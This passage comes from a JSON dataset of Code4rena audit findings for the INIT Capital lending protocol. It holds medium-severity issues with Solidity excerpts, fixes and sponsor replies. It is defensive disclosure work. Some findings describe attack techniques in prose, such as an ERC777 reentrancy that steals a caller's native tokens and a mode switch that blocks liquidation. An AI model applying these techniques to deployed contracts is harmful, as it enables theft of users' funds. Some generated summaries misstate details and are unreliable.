will revert in underflow.\n\n### Recommended Mitigation Steps\n\nIf the oracle timestamp comes from the future, the code should consider it not stale.\n\nCan change the code to:\n\n    if (block.timestamp > timestamp) {\n     _require(block.timestamp - timestamp <= dataFeedInfo.maxStaleTime, Errors.MAX_STALETIME_EXCEEDED);\n    }\n\n\n**[fez-init (INIT) confirmed](https://github.com/code-423n4/2023-12-initcapital-findings/issues/4#issuecomment-1869777419)**\n\n\n***\n\n",
      "summary": "\nThe bug report discusses a problem with the code in the Api3OracleReader.sol file. The code assumes that the timestamp returned from the oracle is always in the past, but this is not always the case. If the timestamp is greater than the current timestamp, the transaction will revert and block the oracle lookup. This can happen when the relayer on the Api3 side updates the oracle price timestamp and value. The recommended mitigation step is to change the code to consider the timestamp not stale if it comes from the future.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/4",
      "tags": [],
      "finders": [
        "0x73696d616f",
        "ladboy233"
      ]
    },
    {
      "id": "29601",
      "title": "[M-10] Lack of way to handle not fully repaid bad debt after liquidation after the lending pool share or WLP are fully seized",
      "impact": "MEDIUM",
      "content": "\nWhen user has bad debt, user's borrow credit > collateral credit. Liqudiator can step in and liquidate and seize user's share or seize user WLP and repay the debt.\n\nWhile the liquidate function aims to let liqudiator take the min share available for bad debt repayment.\n\n```solidity\n// take min of what's available (for bad debt repayment)\nshares = shares.min(IPosManager(POS_MANAGER).getCollAmt(_posId, _poolOut)); // take min of what's available\n_require(shares >= _minShares, Errors.SLIPPAGE_CONTROL);\n```\n\nAfter the user's pool share is transferred out, or after user's WLP is seized, the rest of unpaid debt becomes bad debt permanently. For example, user's borrow 1000 USDT and has debt 1000 USDT. His share is only worth 500 USD as collateral price drops. Because the code lets liquidator take min of what's available for both lending pool share and take min of what's available (for bad debt repayment) for WLP amount. The liqudiator can repay 800 USD and seize share of 500 USD. However, there are 200 USD remaining debt. When other liquidators (even this liquidator belongs to protocol) writes to repay and erase the rest 200 USD bad debt, he cannot because [removeCollateralTo validates share > 0, if share is 0, revert](https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/core/PosManager.sol#L235).\n\n```solidity\n_require(_shares > 0, Errors.ZERO_VALUE);\n```\n\nIf the underlying collateral is WLP, the second liquidation aims to write off bad debt does not work as well because if all WLP is transfered out, calling [\\_harvest and unwrap again is likely to revert](https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/core/PosManager.sol#L265).\n\n```solidity\n_harvest(_posId, _wLp, _tokenId);\nIBaseWrapLp(_wLp).unwrap(_tokenId, _amt, _receiver);\n```\n\nThe bad permanently inflates the totalAssets() in lending pool and inflates the total debt to not let other users borrow from protocol because of the borrow cap checks.\n\nAlso, the lender suffers the loss because if the bad debt is not repaid, the lender that deposit cash into the lending pool is lost.\n\n### Recommended Mitigation Steps\n\nAdd a way to handle not fully repaid bad debt after liquidation after the lending pool share or WLP is fully seized.\n\nAdd a function to donate to the lending pool to let user supply asset or add a function to socialize the bad debt as loss explicilty.\n\n**[fez-init (INIT) confirmed](https://github.com/code-423n4/2023-12-initcapital-findings/issues/9#issuecomment-1869836241)**\n\n***\n\n",
      "summary": "\nSummary:\n\nA bug has been found in the code where a user with bad debt may have their share or WLP seized by a liquidator. However, the code does not account for the remaining debt, leading to a permanent bad debt. This can also cause issues with the totalAssets and total debt calculations, preventing other users from borrowing from the protocol. To mitigate this issue, the code should be updated to handle partially repaid bad debt and potentially add a function to donate or socialize the bad debt as a loss. This bug has been confirmed by the INIT team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/9",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "ladboy233"
      ]
    },
    {
      "id": "29600",
      "title": "[M-09] If wLP is blacklisted, then user will not be able to withdraw it",
      "impact": "MEDIUM",
      "content": "\nWhen users deposit wLP tokens as collateral, then they are checked [to be whitelisted](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L255).\n\nLater, it's possible that for some reason wLP token [will be blacklisted](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/Config.sol#L145) by governor. And once it's done, then users who already used that wLP token as collateral [will not be able to withdraw them](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L275).\n\nAlso same thing exists for the `liquidateWLp` function, which means that in case if position, that is collateralized with wLP that is blacklisted, will become unhealthy, then liquidators [will not be able to liquidate it](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L327).\n\nSponsor said that blacklisting flow will be as following.\n\n*   Decrease collateral factor for blacklisted wLp until it becomes 0\n*   then blacklist wLp\n\nConsidering this fact I realize that for liquidation this will not be an issue as wLp will have 0 collateralization power when it will be blacklisted. However it's still possible that some users will not decollateralize their wLp tokens yet for some reasom and thus they will not be able to withdraw them later.\n\n### Impact\n\nUser can't withdraw previously deposited wLP tokens after they were blacklisted.\n\n### Tools Used\n\nVsCode\n\n### Recommended Mitigation Steps\n\nEven if wLP token is blacklisted now, you still should allow user to withdraw them. After all you have health check function that will guarantee that position has enough collateral.\n\n**[fez-init (INIT) acknowledged and commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/13#issuecomment-1870294773):**\n > We will use unwhitelisting with care.\n\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the InitCapital platform where users are unable to withdraw wLP tokens that they have previously deposited as collateral. This is because the wLP tokens may be blacklisted by the governor, which prevents users from withdrawing them. This also affects the ability of liquidators to liquidate positions that are collateralized with blacklisted wLP tokens. The sponsor has proposed a solution to decrease the collateral factor for blacklisted wLP tokens until it reaches 0, and then blacklist the token. However, this could still prevent users from withdrawing their tokens if they have not decollateralized them yet. The impact of this bug is that users are unable to withdraw their wLP tokens after they have been blacklisted. The recommended mitigation steps suggest allowing users to withdraw their tokens even if they have been blacklisted, as the health check function ensures that the position has enough collateral. The bug was reported using VsCode. The sponsor has acknowledged the issue and stated that they will use unwhitelisting with caution.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/13",
      "tags": [],
      "finders": [
        "0x73696d616f",
        "rvierdiiev",
        "ladboy233"
      ]
    },
    {
      "id": "29599",
      "title": "[M-08] `TRST-M-8` from previous audit still present",
      "impact": "MEDIUM",
      "content": "\nInterest accruing is not paused, when repaying is not allowed.\n\n### Proof of Concept\n\nTRST-M-8 from previous audit describes the fact, that when repaying is paused, then pool still continue accruing interests. Usually this is not considered as a medium bug anymore.\nHowever, protocol team has stated that they have fixed everything.\n\nI should say that TRST-M-8 still exists and in case repayment will be paused and user will not be able to reduce their debt, their debt shares will continue to accrue interest.\n\n### Tools Used\n\nVsCode\n\n### Recommended Mitigation Steps\n\nYou can implement the logic that will pause all interest accruing as well, but I am not sure this is indeed needed.\n\n**[fez-init (INIT) acknowledged and commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/17#issuecomment-1870188388):**\n > There might have been miscommunications with this issue being resolved. This issue from Trust should be communicated as acknowledged.\n\n**[hansfriese (Judge) commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/17#issuecomment-1871329916):**\n > According to the sponsor's comment, it's worth keeping it as a valid medium.\n\n***\n\n",
      "summary": "\nThis report discusses a bug in the Interest Accruing feature of the TRST-M-8 protocol. The bug causes interest to continue accruing even when repaying is paused, which can lead to users accumulating more debt than intended. The protocol team has stated that they have fixed the issue, but the bug still exists. The recommended mitigation step is to implement a logic that pauses all interest accruing, but it is uncertain if this is necessary. The issue has been acknowledged by the sponsor and should be considered a valid medium bug. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/17",
      "tags": [],
      "finders": [
        "said",
        "rvierdiiev",
        "ladboy233"
      ]
    },
    {
      "id": "29598",
      "title": "[M-07] Malicious user can steal native tokens of MoneyMarketHook caller",
      "impact": "MEDIUM",
      "content": "\nMoneyMarketHook allows user to chain some actions into one multicall to the InitCore. In the end user can get all wrapped native tokens that he withdrew [in a form of native token](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L76-L80). Note, that this part of code withdraws all balance from wrapped token and the sends all balance to the `msg.sender`. In case if balance of contract is 0, then the call will still succeed.\n\nOne type of actions that caller can do using `execute` function [is withdraw](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L124). In case if caller needs to repay funds to other address then he can provide it [as `to` param](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L181). So as result, `IInitCore.burnTo` will transfer pool tokens [to the provided recipient](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L192). And in case if token has a hook, like erc777 or erc677, then receiver will be triggered and he has execution control now.\n\nUser can have [multiple withdraws in same multicall](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L173). And it's possible that first withdraw is wrapped native token withdraw(which user would like to receive as native) and next withdraw is with erc777 token and other recipient.\n\nIn such case, when first withdraw is done, then wrapped token is already on MoneyMarketHook balance. And then when second withdraw is handled and attacker get hook, then he can call MoneyMarketHook.execute(it doesn't have reentrancy check) again with any params that just should pass and `_params.returnNative` as true. Then all wrapped token balance will be sent to the attacker and then execution will return back to the victim and it will send 0 amount as native token to the victim.\n\nAs result attacker is able to steal user's native tokens.\n\nFrom the readme, it's clear that only fee on transfer tokens are not supported and erc777 are supported:\n\n> Please list specific ERC20 that your protocol is anticipated to interact with. Could be \"any\" (literally anything, fee on transfer tokens, ERC777 tokens and so forth) or a list of tokens you envision using on launch.<br>\n> No fee-on-transfer tokens\n\n### Impact\n\nIt's possible to steal user's funds.\n\n### Tools Used\n\nVsCode\n\n### Recommended Mitigation Steps\n\nAdd reentrancy check to the `execute` function.\n\n**[fez-init (INIT) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/19#issuecomment-1870299489):**\n > This should be a medium issue. There are multiple things that needs to be aligned, including:\n >\n> - supporting of ERC777. We did not intend to support ERC777, but acknowledge that it may not be communicated clearly.\n> - the victim needs to specify a certain malicious `to` contract for the attack to happen.\n\n > We will add reentrancy check to the execute function to prevent this kind of scenario anyways.\n\n**[hansfriese (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/19#issuecomment-1870758513):**\n > I agree Medium is appropriate due to this requirement: \"the victim needs to specify a certain malicious `to` contract for the attack to happen\".\n\n***\n\n",
      "summary": "\nThe MoneyMarketHook allows users to combine several actions into one function called multicall, which can be used to get all wrapped native tokens that were withdrawn. However, there is a bug where an attacker can steal a user's native tokens if the victim specifies a malicious contract in the `to` parameter. This can happen when a user makes multiple withdrawals in the same multicall, and the first withdrawal is wrapped native tokens. The attacker can then use the `execute` function to steal the user's tokens. The severity of this bug has been decreased to medium and the recommended mitigation step is to add a reentrancy check to the `execute` function. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/19",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "29597",
      "title": "[M-06] setPosMode function doesn't check if wLp is whitelisted",
      "impact": "MEDIUM",
      "content": "\nUsing `setPosMode` function owner of position can change it's mode. When the function is called, then there are a lot of checks, like if current mode allows to decollateralize and if new mode allows to collateralize.\n\nAlso it's checked, that all position collateral is used by the new mode. It's done [for the pools](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L189) and [for the wLp tokens](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L193).\n\nIn order to be able to use wLp tokens as collateral, then wLp should be whitelisted. It is checked in several places in the code, [like here](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L255). It's also possible that after some time wLp token will be blacklisted. In this case it should not be allowed to migrate blacklisted wLp token to the new mode, however there is no such check in the setPosMode function.\n\nAs result user can provide blacklisted collateral to the new mode.\nI understand that borrowing factor for such collateral will be likely about 0, however if you would try to collateralize such token, then [it will be denied](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L255), thus setMode function breaks this invariant.\n\n### Impact\n\nNon whitelisted collateral can be moved to the new mode.\n\n### Tools Used\n\nVsCode\n\n### Recommended Mitigation Steps\n\nDo not allow user to move blacklisted collateral to the new mode.\n\n**[fez-init (INIT) confirmed and commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/22#issuecomment-1870308603):**\n > Will add whitelist check.\n\n***\n\n",
      "summary": "\nThe `setPosMode` function allows the owner of a position to change its mode. However, there are several checks that need to be done before the function can be called, such as ensuring the current mode allows for decollateralization and the new mode allows for collateralization. Additionally, the function checks that all of the position's collateral is used by the new mode. However, there is a bug where blacklisted collateral can be used in the new mode, even though it should not be allowed. This can cause issues with the borrowing factor and can potentially break the function's intended purpose. To mitigate this issue, the team should add a check to prevent blacklisted collateral from being used in the new mode. This bug was found using the tool VsCode.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/22",
      "tags": [],
      "finders": [
        "sashik\\_eth",
        "rvierdiiev"
      ]
    },
    {
      "id": "29596",
      "title": "[M-05] `collateralizeWLp` can be bypassed even when collateralization is paused",
      "impact": "MEDIUM",
      "content": "\nAdmin can pause collateralization for a specific mode to prevent users from providing more collateral either via `collateralize` or `collateralizeWLp`. However, due to not properly using internal accounting when tracking wLP collateral, users can still provide more collateral by directly donating tokens to a specific LP `tokenId`.\n\n### Proof of Concept\n\nIt can be seen that when `canCollateralize` of certain mode is paused, `collateralizeWLp` should be paused.\n\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L243-L261>\n\n```solidity\n    /// @inheritdoc IInitCore\n    function collateralizeWLp(uint _posId, address _wLp, uint _tokenId)\n        public\n        virtual\n        onlyAuthorized(_posId)\n        nonReentrant\n    {\n        IConfig _config = IConfig(config);\n        uint16 mode = _getPosMode(_posId);\n        // check mode status\n>>>     _require(_config.getModeStatus(mode).canCollateralize, Errors.COLLATERALIZE_PAUSED);\n        // check if the wLp is whitelisted\n        _require(_config.whitelistedWLps(_wLp), Errors.TOKEN_NOT_WHITELISTED);\n        // check if the position mode supports _wLp\n        _require(_config.isAllowedForCollateral(mode, IBaseWrapLp(_wLp).lp(_tokenId)), Errors.INVALID_MODE);\n        // update collateral on the position\n        uint amtColl = IPosManager(POS_MANAGER).addCollateralWLp(_posId, _wLp, _tokenId);\n        emit CollateralizeWLp(_wLp, _tokenId, _posId, amtColl);\n    }\n```\n\nHowever, when calculating collateral credit, it will calculate based on balance of LP of specific token inside wLP contract.\n\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L456>\n\n```solidity\n    function getCollateralCreditCurrent_e36(uint _posId) public virtual returns (uint collCredit_e36) {\n        address _oracle = oracle;\n        IConfig _config = IConfig(config);\n        uint16 mode = _getPosMode(_posId);\n        // get position collateral\n>>>     (address[] memory pools, uint[] memory shares, address[] memory wLps, uint[][] memory ids, uint[][] memory amts)\n        = IPosManager(POS_MANAGER).getPosCollInfo(_posId);\n        // calculate collateralCredit\n        uint collCredit_e54;\n        for (uint i; i < pools.length; i = i.uinc()) {\n            address token = ILendingPool(pools[i]).underlyingToken();\n            uint tokenPrice_e36 = IInitOracle(_oracle).getPrice_e36(token);\n            uint tokenValue_e36 = ILendingPool(pools[i]).toAmtCurrent(shares[i]) * tokenPrice_e36;\n            TokenFactors memory factors = _config.getTokenFactors(mode, pools[i]);\n            collCredit_e54 += tokenValue_e36 * factors.collFactor_e18;\n        }\n        for (uint i; i < wLps.length; i = i.uinc()) {\n            for (uint j; j < ids[i].length; j = j.uinc()) {\n                uint wLpPrice_e36 = IBaseWrapLp(wLps[i]).calculatePrice_e36(ids[i][j], _oracle);\n                uint wLpValue_e36 = amts[i][j] * wLpPrice_e36;\n                TokenFactors memory factors = _config.getTokenFactors(mode, IBaseWrapLp(wLps[i]).lp(ids[i][j]));\n                collCredit_e54 += wLpValue_e36 * factors.collFactor_e18;\n            }\n        }\n        collCredit_e36 = collCredit_e54 / ONE_E18;\n    }\n```\n\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/PosManager.sol#L125>\n\n```solidity\n    function getPosCollInfo(uint _posId)\n        external\n        view\n        returns (\n            address[] memory pools,\n            uint[] memory amts,\n            address[] memory wLps,\n            uint[][] memory ids,\n            uint[][] memory wLpAmts\n        )\n    {\n        PosCollInfo storage posCollInfo = __posCollInfos[_posId];\n        pools = posCollInfo.collTokens.values();\n        amts = new uint[](pools.length);\n        for (uint i; i < pools.length; i = i.uinc()) {\n            amts[i] = posCollInfo.collAmts[pools[i]];\n        }\n        wLps = posCollInfo.wLps.values();\n        ids = new uint[][](wLps.length);\n        wLpAmts = new uint[][](wLps.length);\n        for (uint i; i < wLps.length; i = i.uinc()) {\n            ids[i] = posCollInfo.ids[wLps[i]].values();\n            wLpAmts[i] = new uint[](ids[i].length);\n            for (uint j; j < ids[i].length; j = j.uinc()) {\n>>>             wLpAmts[i][j] = IBaseWrapLp(wLps[i]).balanceOfLp(ids[i][j]);\n            }\n        }\n    }\n```\n\nIt should be noted that most DEXs (e.g., Uniswap) allow any user to provide liquidity to any other users position. In practice, this bypasses the collateralization paused functionality.\n\n### Recommended Mitigation Steps\n\nImplement internal accounting for wLP inside the `PosManager`.\n\n**[fez-init (INIT) acknowledged and commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/25#issuecomment-1870315217):**\n > Internal accounting shall be ensured in wLp.\n\n**[hansfriese (Judge) commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/25#issuecomment-1871323396):**\n > Medium is appropriate as the admin's action can be bypassed.\n\n***\n\n",
      "summary": "\nA bug has been found in the InitCore.sol contract where the admin can pause collateralization for a specific mode to prevent users from providing more collateral. However, due to not properly using internal accounting, users can still provide more collateral by directly donating tokens to a specific LP token. This bypasses the collateralization paused functionality. It is recommended to implement internal accounting for wLP inside the PosManager contract to mitigate this issue. The severity of this bug is considered medium as the admin's action can be bypassed. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/25",
      "tags": [],
      "finders": [
        "said"
      ]
    },
    {
      "id": "29595",
      "title": "[M-04] `setPosMode` should not allow changing the mode when the new mode's `canRepay` status is disabled",
      "impact": "MEDIUM",
      "content": "\nIn the scenario where the mode's `canRepay` status is set to false, positions using that mode cannot be repaid and liquidated. However, users are allowed to change their position's mode to one where the `canRepay` status is currently set to false. This could be exploited when a position owner observes that their position's health is approaching the liquidation threshold, allowing them to prevent liquidation.\n\n### Proof of Concept\n\nIt can be observed that when `setPosMode` is called, it checks that `newModeStatus.canBorrow` and `currentModeStatus.canRepay` is set to true. However, it doesn't check the status of `newModeStatus.canRepay` flag.\n\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L203-L204>\n\n<details>\n\n```solidity\n    function setPosMode(uint _posId, uint16 _mode)\n        public\n        virtual\n        onlyAuthorized(_posId)\n        ensurePositionHealth(_posId)\n        nonReentrant\n    {\n        IConfig _config = IConfig(config);\n        // get current collaterals in the position\n        (address[] memory pools,, address[] memory wLps, uint[][] memory ids,) =\n            IPosManager(POS_MANAGER).getPosCollInfo(_posId);\n        uint16 currentMode = _getPosMode(_posId);\n        ModeStatus memory currentModeStatus = _config.getModeStatus(currentMode);\n        ModeStatus memory newModeStatus = _config.getModeStatus(_mode);\n        if (pools.length != 0 || wLps.length != 0) {\n            _require(newModeStatus.canCollateralize, Errors.COLLATERALIZE_PAUSED);\n            _require(currentModeStatus.canDecollateralize, Errors.DECOLLATERALIZE_PAUSED);\n        }\n        // check that each position collateral belongs to the _mode\n        for (uint i; i < pools.length; i = i.uinc()) {\n            _require(_config.isAllowedForCollateral(_mode, pools[i]), Errors.INVALID_MODE);\n        }\n        for (uint i; i < wLps.length; i = i.uinc()) {\n            for (uint j; j < ids[i].length; j = j.uinc()) {\n                _require(_config.isAllowedForCollateral(_mode, IBaseWrapLp(wLps[i]).lp(ids[i][j])), Errors.INVALID_MODE);\n            }\n        }\n        // get current debts in the position\n        uint[] memory shares;\n        (pools, shares) = IPosManager(POS_MANAGER).getPosBorrInfo(_posId);\n        IRiskManager _riskManager = IRiskManager(riskManager);\n        // check that each position debt belongs to the _mode\n        for (uint i; i < pools.length; i = i.uinc()) {\n            _require(_config.isAllowedForBorrow(_mode, pools[i]), Errors.INVALID_MODE);\n            _require(newModeStatus.canBorrow, Errors.BORROW_PAUSED);\n            _require(currentModeStatus.canRepay, Errors.REPAY_PAUSED);\n            // update debt on current mode\n            _riskManager.updateModeDebtShares(currentMode, pools[i], -shares[i].toInt256());\n            // update debt on new mode\n            _riskManager.updateModeDebtShares(_mode, pools[i], shares[i].toInt256());\n        }\n        // update position mode\n        IPosManager(POS_MANAGER).updatePosMode(_posId, _mode);\n        emit SetPositionMode(_posId, _mode);\n    }\n```\n</details>\n\nAs mentioned before, if users see his position's health status is about to reach liquidation threshold and change the mode, this will allow users to prevent their positions from getting liquidated, as both `liquidate` and `liquidateWLp` will check the `canRepay` flag and revert if it's not allowed.\n\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L282-L314><br>\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L317-L353><br>\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L587-L599>\n\n```solidity\n    /// @dev liquidation internal logic\n    function _liquidateInternal(uint _posId, address _poolToRepay, uint _repayShares)\n        internal\n        returns (LiquidateLocalVars memory vars)\n    {\n        vars.config = IConfig(config);\n        vars.mode = _getPosMode(_posId);\n\n        // check position must be unhealthy\n        vars.health_e18 = getPosHealthCurrent_e18(_posId);\n        _require(vars.health_e18 < ONE_E18, Errors.POSITION_HEALTHY);\n\n>>>     (vars.repayToken, vars.repayAmt) = _repay(vars.config, vars.mode, _posId, _poolToRepay, _repayShares);\n    }\n```\n\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L530-L551>\n\n```solidity\n    function _repay(IConfig _config, uint16 _mode, uint _posId, address _pool, uint _shares)\n        internal\n        returns (address tokenToRepay, uint amt)\n    {\n        // check status\n>>>     _require(_config.getPoolConfig(_pool).canRepay && _config.getModeStatus(_mode).canRepay, Errors.REPAY_PAUSED);\n        // get position debt share\n        uint positionDebtShares = IPosManager(POS_MANAGER).getPosDebtShares(_posId, _pool);\n        uint sharesToRepay = _shares < positionDebtShares ? _shares : positionDebtShares;\n        // get amtToRepay (accrue interest)\n        uint amtToRepay = ILendingPool(_pool).debtShareToAmtCurrent(sharesToRepay);\n        // take token from msg.sender to pool\n        tokenToRepay = ILendingPool(_pool).underlyingToken();\n        IERC20(tokenToRepay).safeTransferFrom(msg.sender, _pool, amtToRepay);\n        // update debt on the position\n        IPosManager(POS_MANAGER).updatePosDebtShares(_posId, _pool, -sharesToRepay.toInt256());\n        // call repay on the pool\n        amt = ILendingPool(_pool).repay(sharesToRepay);\n        // update debt on mode\n        IRiskManager(riskManager).updateModeDebtShares(_mode, _pool, -sharesToRepay.toInt256());\n        emit Repay(_pool, _posId, msg.sender, _shares, amt);\n    }\n```\n### Recommended Mitigation Steps\n\nAdd a `canRepay` check status inside `setPosMode`; if it is paused, revert the change. Besides that, the `canRepay` and `canBorrow` checks don't need to be inside the pools check loop.\n\n<details>\n\n```diff\n    function setPosMode(uint _posId, uint16 _mode)\n        public\n        virtual\n        onlyAuthorized(_posId)\n        ensurePositionHealth(_posId)\n        nonReentrant\n    {\n        IConfig _config = IConfig(config);\n        // get current collaterals in the position\n        (address[] memory pools,, address[] memory wLps, uint[][] memory ids,) =\n            IPosManager(POS_MANAGER).getPosCollInfo(_posId);\n        uint16 currentMode = _getPosMode(_posId);\n        ModeStatus memory currentModeStatus = _config.getModeStatus(currentMode);\n        ModeStatus memory newModeStatus = _config.getModeStatus(_mode);\n        if (pools.length != 0 || wLps.length != 0) {\n            _require(newModeStatus.canCollateralize, Errors.COLLATERALIZE_PAUSED);\n            _require(currentModeStatus.canDecollateralize, Errors.DECOLLATERALIZE_PAUSED);\n        }\n        // check that each position collateral belongs to the _mode\n        for (uint i; i < pools.length; i = i.uinc()) {\n            _require(_config.isAllowedForCollateral(_mode, pools[i]), Errors.INVALID_MODE);\n        }\n        for (uint i; i < wLps.length; i = i.uinc()) {\n            for (uint j; j < ids[i].length; j = j.uinc()) {\n                _require(_config.isAllowedForCollateral(_mode, IBaseWrapLp(wLps[i]).lp(ids[i][j])), Errors.INVALID_MODE);\n            }\n        }\n        // get current debts in the position\n        uint[] memory shares;\n        (pools, shares) = IPosManager(POS_MANAGER).getPosBorrInfo(_posId);\n        IRiskManager _riskManager = IRiskManager(riskManager);\n        // check that each position debt belongs to the _mode\n+      _require(newModeStatus.canBorrow, Errors.BORROW_PAUSED);\n+      _require(currentModeStatus.canRepay, Errors.REPAY_PAUSED);\n+      _require(newModeStatus.canRepay, Errors.REPAY_PAUSED);\n        for (uint i; i < pools.length; i = i.uinc()) {\n            _require(_config.isAllowedForBorrow(_mode, pools[i]), Errors.INVALID_MODE);\n-            _require(newModeStatus.canBorrow, Errors.BORROW_PAUSED);\n-            _require(currentModeStatus.canRepay, Errors.REPAY_PAUSED);\n            // update debt on current mode\n            _riskManager.updateModeDebtShares(currentMode, pools[i], -shares[i].toInt256());\n            // update debt on new mode\n            _riskManager.updateModeDebtShares(_mode, pools[i], shares[i].toInt256());\n        }\n        // update position mode\n        IPosManager(POS_MANAGER).updatePosMode(_posId, _mode);\n        emit SetPositionMode(_posId, _mode);\n    }\n```\n\n</details>\n\n**[fez-init (INIT) confirmed](https://github.com/code-423n4/2023-12-initcapital-findings/issues/26#issuecomment-1870318447)**\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue where positions using a certain mode cannot be repaid and liquidated. However, users are allowed to change their position's mode to one where this is not possible, which could be exploited to prevent liquidation. The report includes a proof of concept and recommended mitigation steps, which involve adding a check for the `canRepay` status when changing a position's mode. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/26",
      "tags": [],
      "finders": [
        "said"
      ]
    },
    {
      "id": "29594",
      "title": "[M-03] When the `returnNative` parameter is set to true in the `_params` provided to `MoneyMarketHook.execute`, it is not handled properly and could disrupt user expectations",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L168-L196> \n\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L76-L80>\n\nWhen `param.returnNative` is set to true while calling `MoneyMarketHook.execute`, users expect the returned token from the withdraw operation to be in native form and sent to the caller. However, in the current implementation, this is not considered and could disrupt user expectations.\n\n### Proof of Concept\n\nThe withdraw functionality inside `MoneyMarketHook` will process the `WithdrawParams` provided by users and construct the operations using `_handleWithdraw`, which consist of calling `decollateralize` and `burnTo` in `InitCore`, providing the parameters accordingly.\n\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L168-L196>\n\n```solidity\n    function _handleWithdraw(uint _offset, bytes[] memory _data, uint _initPosId, WithdrawParams[] calldata _params)\n        internal\n        view\n        returns (uint, bytes[] memory)\n    {\n        for (uint i; i < _params.length; i = i.uinc()) {\n            // decollateralize to pool\n            _data[_offset] = abi.encodeWithSelector(\n                IInitCore.decollateralize.selector, _initPosId, _params[i].pool, _params[i].shares, _params[i].pool\n            );\n            _offset = _offset.uinc();\n            // burn collateral to underlying token\n            address helper = _params[i].rebaseHelperParams.helper;\n            address uTokenReceiver = _params[i].to;\n            // if need to unwrap to rebase token\n            if (helper != address(0)) {\n                address uToken = ILendingPool(_params[i].pool).underlyingToken();\n                _require(\n                    _params[i].rebaseHelperParams.tokenIn == uToken\n                        && IRebaseHelper(_params[i].rebaseHelperParams.helper).YIELD_BEARING_TOKEN() == uToken,\n                    Errors.INVALID_TOKEN_IN\n                );\n                uTokenReceiver = helper;\n            }\n            _data[_offset] = abi.encodeWithSelector(IInitCore.burnTo.selector, _params[i].pool, uTokenReceiver);\n            _offset = _offset.uinc();\n        }\n        return (_offset, _data);\n    }\n```\n\nAs 